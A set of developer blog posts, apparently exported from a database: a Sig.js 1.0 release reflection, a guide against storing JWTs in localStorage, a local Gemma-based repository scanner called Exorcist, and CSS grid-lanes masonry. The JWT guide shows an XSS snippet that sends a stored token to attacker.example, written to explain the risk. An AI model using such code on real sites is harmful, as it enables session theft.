Sig reaching 1.0 isn't just a milestone for Sig.

It's progress toward KiwiEngine becoming the engine I've been describing throughout this series.

Because an engine needs dependable components.

Not just promising prototypes.

Not just architectural diagrams.

Not just ideas about how everything might work together someday.

It needs actual systems with defined responsibilities and stable interfaces.

Juice is continuing toward that point.

Nectarine is developing its role.

Seltzer is establishing its communication boundaries.

WebEngine is bringing the pieces together.

And now Sig has reached its first stable major release.

One of the components is ready to stand on its own.

That's real progress.

Now I Get To Build With It

This is probably what I'm looking forward to most.

I've spent a lot of time building tools for building things.

And I enjoy that.

I genuinely enjoy architecture.

I enjoy thinking about APIs.

I enjoy designing systems.

But I also have a lot of applications I want to create.

Blackwater Sound.

WebStore.

Artist platforms.

Music software.

Interactive creative tools.

Applications that support my other businesses and projects.

Sig is part of the foundation that will help me build those things.

And now I have a stable release I can begin depending on.

That's the payoff.

Not the version number by itself.

What the version number allows me to start doing.

The Road Doesn't End At 1.0

There's still plenty of work ahead.

Sig will continue evolving.

There will be bugs to fix.

Documentation to improve.

Patterns to discover through real applications.

And probably a few architectural assumptions that real-world usage will challenge.

That's part of building software.

But the nature of the work is changing.

I'm no longer only trying to figure out what Sig should become.

I'm beginning to build on what it already is.

And that feels like a pretty significant milestone.

Sig.js 1.0 is here.

One library has reached a stable foundation.

One more piece of KiwiEngine is ready.

And the engine is getting closer to doing what I built it for in the first place.

Helping me build the things I've been imagining.

articles.title: Stop Storing JWTs in localStorage. Here's Why.
articles.description: You've probably seen this in a React authentication tutorial:    localStorage.setItem("token",...
articles.body_html:
You've probably seen this in a React authentication tutorial:

localStorage.setItem("token", response.token);

User logs in. Save the JWT. Send it with every API request.

Simple, right?

There's one problem: any JavaScript running on your page can read that token.

And that includes malicious JavaScript.

What's Actually Wrong With localStorage?

Imagine your application has an XSS (Cross-Site Scripting) vulnerability.

An attacker manages to execute this:

const token = localStorage.getItem("token");

fetch("https://attacker.example/steal", {
  method: "POST",
  body: token,
});

That's it.

Your user's authentication token could now be in someone else's hands.

The attacker may be able to use it to access the user's account until the token expires or is revoked.

And XSS isn't the only concern. A compromised npm dependency running in your frontend can potentially access the same storage.

The problem isn't JWT itself. It's where you're storing it.

A Better Approach: HttpOnly Cookies

Instead of saving your JWT in localStorage, let your backend set a secure cookie.

Set-Cookie: session=eyJhbGciOi...;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Path=/

Three important properties:

  • HttpOnly: JavaScript cannot read the cookie.
  • Secure: The browser sends it only over HTTPS (with limited localhost exceptions).
  • SameSite=Strict: Helps prevent cross-site requests from carrying the cookie.

Now, even if an attacker executes:

document.cookie

They won't see your HttpOnly authentication cookie.

And your browser can automatically include that cookie in requests to your backend.

fetch("/api/profile", {
  credentials: "same-origin",
});

No manually reading or attaching JWTs.

Much cleaner.

But Cookies Aren't Magic

Here's something tutorials often forget.

HttpOnly protects the token from being read. It doesn't make XSS harmless.

Malicious JavaScript can still send authenticated requests from your application.

And cookies introduce another concern: CSRF (Cross-Site Request Forgery).

For cookie-based authentication, use appropriate CSRF defenses:

  • Validate request origins.
  • Use SameSite cookies.
  • Add CSRF tokens where needed.

One common approach is the double-submit cookie pattern, where the server validates a CSRF token sent with the request. In production, prefer a signed token bound to the authenticated session.

SameSite=Strict helps, but it shouldn't be your entire CSRF strategy.

What About JWT Expiration?

There's another issue worth understanding.

Imagine you issue a JWT valid for seven days.

Tomorrow, you discover that your signing key has been compromised.

What happens to all those tokens?

You need a way to rotate your signing keys safely.

Meet JWT Key Rotation

Instead of using one signing key forever, maintain a keyring.

Each JWT contains a key identifier (kid) in its header.

{
  "alg": "RS256",
  "kid": "key-2026-02"
}

Your backend uses that identifier to find the correct verification key.

When rotating keys:

  1. Generate a new signing key.
  2. Start signing new tokens with it.
  3. Keep the old verification key temporarily.
  4. Remove it after all old tokens expire.

This allows normal key rotation without immediately logging everyone out.

Important: If a key is actually compromised, keeping it trusted is dangerous. Emergency rotation may require invalidating existing tokens.

For better session control, use short-lived access tokens, carefully protected refresh sessions, and server-side revocation where needed.

So, Should You Never Use localStorage?

Not necessarily.

localStorage is perfectly useful for things like themes, language preferences, and non-sensitive settings.

For authentication tokens, though, storing bearer credentials in JavaScript-accessible storage creates an avoidable token-theft risk.

HttpOnly cookies are often a better default for traditional browser applications.

Other architectures, including OAuth-based SPAs and mobile clients, may need different approaches.

The Takeaway

JWT is just a token format.

It doesn't automatically make your authentication secure.

Where you store tokens, how you protect requests, how you handle expiration, and how you revoke sessions matter just as much.

Authentication isn't finished when login works. It's finished when you've thought about what happens when something goes wrong.

How are you currently handling authentication in your applications?

articles.title: My Repository Was Haunted. So I Built a CLI -"Exorcist" to Find the Spirits.
articles.description: This is a submission for the Hacktoberfest Open-Source AI Challenge Week 4: Ghost in the...
articles.body_html:
This is a submission for the Hacktoberfest Open-Source AI Challenge Week 4: Ghost in the Machine

Exorcist: The Ghosts Hiding in Your Codebase 👻

It is late. You open a repository you have not touched in months.

The feature works. The tests pass. The README looks fine.

Then you notice a configuration file you do not remember adding. A dependency nobody seems to use. A scheduled job whose purpose has been lost to time. Somewhere in the repository, a secret might still be sitting in plain sight.

Nothing is necessarily on fire. That is what makes these things easy to miss.

Software accumulates history. Some of that history is useful; some of it becomes residue: forgotten assumptions, stale code, suspicious configuration, and small risks that survive long after the context behind them disappears.

I wanted to build a tool for investigating that residue without asking developers to hand their source code to a cloud AI service.

That became Exorcist, a local-first command-line tool that scans a repository for selected signals, then uses an open-weight model to help explain what the scanners found.

The idea behind it is simple: the scanners find the evidence; Gemma helps explain it; the developer stays in control.

What I Built

Exorcist is a Python CLI for investigating four kinds of repository “ghosts”:

  • Secrets: potential credentials and sensitive strings that should not be committed.
  • Dependencies: dependency declarations that may deserve a closer look.
  • Dead code: code that appears unused or obsolete.
  • Scheduled jobs: cron or workflow entries that may have been forgotten.

I interpreted the “Ghost in the Machine” theme as the invisible residue software leaves behind. A forgotten token, an obsolete function, or a scheduled task nobody remembers can be easy to overlook precisely because it has become part of the background.

Exorcist turns that investigation into a repeatable workflow:

  1. Scan locally. Run the selected checks against a repository on disk.
  2. Redact sensitive evidence. Mask secret-like values before they are passed into explanations or reports.
  3. Ask Gemma to triage, not to invent evidence. The model classifies and explains scanner findings; it does not replace the scanners.
  4. Validate the response. Pydantic checks structured model output. Exorcist attempts one repair if the output is invalid; if it still fails, the result can be marked for human review.
  5. Generate a report. Produce JSON results or an offline HTML report with findings, verdicts, redacted evidence, model metadata, and scan status.

The CLI includes commands such as doctor, scan, report, guide, rules, tracks, explain, and version. Optional integrations include tools such as Gitleaks and Vulture where appropriate.

I did not want an AI model to confidently declare a repository safe. I wanted a tool that could show its work, explain its conclusions, and be honest when something needs a human.

The first exorcism: a real local demo

For validation, I cloned a small public project, jersey-paglu, and ran Exorcist against the local checkout.

The selected checks completed with zero findings.

That was not a dramatic wall of red warnings, and that is worth saying plainly. A clean result means these selected checks did not detect anything in that run. It does not prove that the repository is universally secure or that every possible issue has been ruled out.

The demo exercised the local model check, plain-text output, JSON output, and HTML report generation. During the scan and report workflow, Exorcist recorded zero network calls. Cloning the repository itself required network access; the scan and report were run against the local copy.

The terminal demo

The generated report

The result I care about is not just the number of findings. It is that the process can be run locally, exported in machine-readable form, and reviewed in a report without requiring a cloud inference call.

Demo

The demo was validated on a local Windows environment using gemma3:4b through Ollama.

# Check that Exorcist and the local model are available
exorcist doctor --model gemma3:4b

# Scan selected categories in a local checkout
exorcist scan ./demo/jersey-paglu \
  --model gemma3:4b \
  --types secrets,deps,deadcode,cron \
  --plain

# Export machine-readable results
exorcist scan ./demo/jersey-paglu \
  --model gemma3:4b \
  --types secrets,deps,deadcode,cron \
  --json

# Generate an offline HTML report
exorcist report ./demo/jersey-paglu \
  --model gemma3:4b \
  --out ./demo/jersey-paglu-real-report.html

Paths may vary by operating system and installation. The target repository must already be available locally before running the offline scan.

The terminal transcript and generated HTML report screenshots above are hosted on DEV.to and show the validation run.

Code

Repository:

ADITYA-KUMAR-2358 / Exorcist

Exorcist

Exorcist is a local-first CLI for finding and banishing possessed code secrets, vulnerable dependencies, dead code, and zombie jobs.

Node CLI

The npm CLI is available as @aditya-kumar-2358/exorcist and provides a Windows Terminal-inspired experience with a cyan EXORCIST wordmark, local Ollama metadata, step-by-step scans, and offline HTML reports.

npx @aditya-kumar-2358/exorcist scan .
npx @aditya-kumar-2358/exorcist scan . --json

The package requires Node 18 or newer. Use --no-color for legacy consoles, --json for automation, and --verbose for diagnostic stack traces.

Sample terminal output

  EEEEE  X   X   OOO   RRRR    CCCC  III  SSS   TTTTT
  E       X X   O   O  R   R  C       I  S       T
  EEEE     X    O   O  RRRR   C       I   SSS    T
  E       X X   O   O  R R    C       I      S   T
  EEEEE  X   X   OOO   R  RR   CCCC  III  SSS    T
  @exorcist/cli  v0.2.0
  Local-first AI code
…
View on GitHub

The most important design decision is the boundary between evidence and interpretation. A scanner can point to a suspicious pattern; the model can help explain why it might matter. But model-generated text should never be accepted as reliable merely because it sounds confident.

A simplified example of the kind of structured contract used to validate triage output looks like this:

from pydantic import BaseModel, Field
from typing import Literal

class FindingTriage(BaseModel):
    verdict: Literal[
        "actionable",
        "needs_review",
        "likely_false_positive",
    ]
    explanation: str = Field(min_length=1)
    confidence: float = Field(ge=0.0, le=1.0)
    recommended_action: str

This is an illustrative example of the validation boundary, not a claim that every internal field or enum is identical to this snippet. The important principle is that model output is parsed and validated before it is used.

The report also needs to be careful about what it repeats. If a tool is investigating a possible secret, it should not create a second place where that secret is exposed. Exorcist redacts sensitive evidence before it is included in explanations and reports.

How I Built It

Exorcist is built with a Python-first stack:

  • Python 3.11+ for the CLI and scanner workflow.
  • Typer for commands and options.
  • Pydantic v2 for validating structured model output.
  • Ollama + Google Gemma 3 4B (gemma3:4b) for local inference.
  • GitPython / Git CLI for working with local repositories.
  • Jinja2 for rendering the HTML report.
  • pytest and Ruff for testing and code-quality checks.
  • Gitleaks and Vulture as optional tools for relevant checks.

The runtime connects to the local Ollama service rather than sending repository content to a hosted LLM endpoint. The model can be selected with --model, which keeps the inference choice flexible instead of permanently coupling the tool to a single model.

The rule: scanners first, AI second

This boundary is the heart of Exorcist:

  • Scanners detect. They produce the evidence a finding is based on.
  • Gemma interprets. It helps classify findings and explain them in language a developer can act on.
  • Pydantic validates. It prevents unstructured model text from being accepted as a reliable result.
  • The developer decides. Ambiguous or invalid output can be flagged for human review instead of being silently treated as fact.

That separation matters. An LLM can produce a plausible explanation for a finding that is wrong, or miss the significance of a real issue. The tool should not confuse fluency with proof.

Exorcist is therefore not a promise that AI can guarantee security. It is a way to make scanner output easier to understand while keeping the evidence and its limitations visible.

Gemma and GitHub Copilot have different jobs

Exorcist uses Google Gemma 3 4B locally through Ollama to classify and explain findings detected by deterministic scanners. This makes the project relevant to Best Use of Gemma: Gemma is part of the product's runtime path, but it is deliberately not the source of truth for detection.

GitHub Copilot was used during development in VS Code to help implement and iterate on CLI features, scanner workflows, reports, documentation, tests, local setup, and demo validation. Copilot is a development assistant; it is not part of Exorcist's runtime product path.

The distinction is important:

Gemma powers the product; Copilot supported the development workflow.

Why Does Open Innovation Matter?

A repository scanner can encounter some of a developer's most sensitive material: source code, configuration, dependency details, and accidentally committed credentials. If every explanation required uploading that material to a closed cloud API, privacy would become a prerequisite problem rather than a design choice.

Open-weight models and local inference change that trade-off.

With Gemma running through Ollama, Exorcist can provide model-assisted explanations without depending on a remote inference service. Developers can inspect the workflow, choose a compatible local model, and adapt the tool to their own repositories and constraints. The scan-and-report path can also work where cloud access is restricted or simply undesirable.

Open innovation matters here for three reasons:

  1. Privacy and control. Source code stays on the developer's machine during the local scan and report workflow.
  2. Adaptability. The model can be changed through a CLI option instead of being hard-wired to a hosted endpoint.
  3. Inspectable boundaries. The project separates deterministic checks from model-generated interpretation, making it easier to reason about what the tool knows and what it is suggesting.

Open-weight does not mean infallible, and local does not mean every result is correct. The scanners have coverage limits, local models can make mistakes, and important findings still deserve human review. The goal is not to remove human judgment. It is to make useful AI assistance more accessible without making cloud inference a requirement.

The Spirit of It

The ghost I wanted to hunt is not supernatural. It is the tiny, forgotten decision that quietly survives in a codebase: a token copied into a config file, a dependency nobody recognizes, or a scheduled task that still runs after its original purpose has disappeared.

These things rarely announce themselves. They hide in ordinary files, between the code a developer actively maintains and the code they no longer remember.

I like the idea of a tool that treats this as an investigation rather than a verdict. It should show what was checked, explain what was found, and admit what remains uncertain. It should not send a repository away to a cloud AI service just to make its output sound more human.

Exorcist does not promise to banish every bug or prove a repository safe. It gives developers a local, explainable starting point: evidence from scanners, a model-assisted interpretation, and a report they can inspect.

For me, the best outcome is not a dramatic red warning. It is a developer understanding what was checked, what was found, what remains uncertain, and what deserves attention next.

Prize Categories

  • Best Use of Gemma: Exorcist uses Google Gemma 3 4B locally through Ollama to classify and explain findings detected by deterministic scanners, with zero cloud inference or scan-time network calls.
  • Best Use of GitHub Copilot: GitHub Copilot was used in VS Code to help build and iterate on the CLI, scanner workflow, reports, documentation, tests, local setup, and demo validation. Copilot is not part of Exorcist's runtime product path.

Built solo, slowly and steadily, by Aditya Kumar.

articles.title: Stop Using a JS Masonry Library. CSS Grid Lanes Does It Natively.
articles.description: Masonry layouts have meant a JS library or a CSS column-count hack that scrambles reading order ever since Pinterest made the look popular. CSS Grid Lanes finally does it natively — here's the real support story and how to ship it today.
articles.body_html:
Open any "masonry" npm package's GitHub issues and you'll find the same complaint, filed every few months in different words: items jump on resize, SSR renders everything in one column until JS hydrates, and the bundle is 15–40KB for something that is, conceptually, "pack boxes into the shortest column." It's a layout problem. It has needed a JavaScript library to solve because CSS Grid — for all its power — has never been able to do it. Every row in a CSS grid has to be the same height across every column. A masonry layout is defined by not having that constraint.

So most teams land on one of two compromises. Neither is actually masonry.

The fix everyone reaches for first

The CSS-only version looks like this, and it's seductive because it needs zero JavaScript:

.gallery {
  columns: 3;
  column-gap: 16px;
}

.gallery > * {
  break-inside: avoid;
  margin-bottom: 16px;
}

It renders a Pinterest-ish grid. Ship it, move on — until someone tabs through the gallery with a keyboard, or a screen reader user navigates it, and the order makes no sense. columns fills the first column top-to-bottom before it starts the second, so if your 12 items are numbered 1–12 in the markup, the visual layout reads 1, 2, 3, 4 down the left column, then 5, 6, 7, 8 down the middle, then 9–12 on the right — not left-to-right the way a grid of cards normally reads, and not the order a screen reader announces it in either. Nobody notices in a quick visual QA pass. It shows up as "why does the keyboard focus jump to the bottom of the page and then back to the middle" three sprints later.

The other common fix is a JS library (masonry-layout, react-masonry-css, or rolling your own ResizeObserver + "find the shortest column, append there" loop). That one gets the packing right, but it pays for it: a layout pass that runs on every resize and every image load, a flash of an unstyled single column before JS hydrates, and a dependency for something that feels like it should be CSS's job.

It should be. As of 2026, in one browser, it finally is.

What was actually missing

CSS Grid lays out in two full passes: define the tracks (rows and columns), then place items into cells that already have a fixed size. That's precisely why Grid can't do masonry on its own — masonry is "don't fix the row heights, just pack each item into whichever column currently has the most room." The CSS Working Group spent years on this as "Grid Level 3," tried a Firefox-only grid-template-rows: masonry syntax behind a flag, and in January 2026 settled on a cleaner final design: a new display value, grid-lanes (and its inline counterpart, inline-grid-lanes), instead of overloading an existing grid property.

The fix: display: grid-lanes 

.gallery {
  display: grid-lanes;
  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
  gap: 16px;
}

That's the whole layout. You still declare grid-template-columns exactly like ordinary Grid — fixed count, auto-fill, minmax(), all of it. The difference is what the browser does with your items: instead of requiring every row to line up across columns, it walks them in DOM order and drops each one into whichever lane (column) currently has the least content. That's a real improvement over the columns hack's worst case — which deterministically exhausts column 1 before column 2 even starts — but it's not a complete guarantee. Because lane heights can drift unevenly, tab order can still zigzag across lanes for some content mixes (DOM item 4 landing, say, in the lane that item 6 "should" occupy). The spec gives you a flow-tolerance property to dampen how far an item is allowed to jump lanes, and a full fix needs a separate, still-experimental property (reading-flow) that no browser currently wires into grid-lanes. What you get today is markup order that usually tracks visual order far more closely than the columns hack ever did — not a watertight promise.

🎮 Try it yourself

▶️ Open the interactive playground →

Runs right in your browser — poke at it and watch the concept react live.

Ordinary Grid placement still works on top of it. An item can jump several lanes with the same syntax you already use:

.gallery .featured {
  grid-column: span 2;
}

The honest catch

This is the part most "masonry is here!" posts skip. As of this writing, Safari is the only browser shipping display: grid-lanes unflagged — it landed in the stable Safari 26.4 release. Chrome and Firefox both have implementations, but both ship them disabled by default, behind an experimental-platform-features flag. There's no date yet for either to flip that switch. If you write display: grid-lanes into production CSS today, the vast majority of your visitors get whatever your fallback declares — not masonry.

That's not a reason to wait. It's a reason to use @supports the way it was built for:

.gallery {
  /* Fallback: plain grid, every item the same visual weight.
     Not masonry, but DOM order stays reading order. */
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
  gap: 16px;
}

@supports (display: grid-lanes) {
  .gallery {
    display: grid-lanes;
  }
}

Visitors on Safari 26.4+ get real masonry today. Everyone else gets a perfectly readable uniform grid instead of a broken one — not the layout you want long-term, but never a layout that embarrasses you. When Chrome and Firefox unflag it, your fallback quietly becomes dead code you can delete, with zero migration.

When the JS library still earns its place

Don't rip out a masonry library the moment you read this. Keep it if you need:

  • Masonry everywhere today, with no visually-degraded fallback acceptable on Chrome or Firefox.
  • Re-flowing based on content you fetch after layout in a way your current library already handles well (infinite scroll galleries with dynamic image dimensions).
  • Fine control over packing order beyond "shortest lane wins" — some libraries support column-balancing heuristics grid-lanes doesn't expose.

For a new project, or the next redesign of an existing gallery, ship the @supports version above. You get the real thing where it's supported and a safe grid everywhere else, for four lines of CSS and zero kilobytes of JavaScript.

🧠 Test yourself

Think it clicked? Take the 7-question quiz →

Instant feedback, a hint on every question, and an explanation for each answer — right or wrong.

The lesson

columns: N was never masonry — it was a print-style multi-column reflow that happened to look like masonry until you checked tab order. The JS libraries got the packing right but paid for it in bundle size and a hydration flash. display: grid-lanes is CSS finally modeling what Pinterest-style layout actually is — a placement algorithm, not a side effect — and @supports means you don't have to choose between "ship it now" and "ship it correctly everywhere."

Are you going to drop display: grid-lanes into a gallery today behind @supports, or wait for Chrome and Firefox to unflag it first? Tell me which, and why, in the comments.
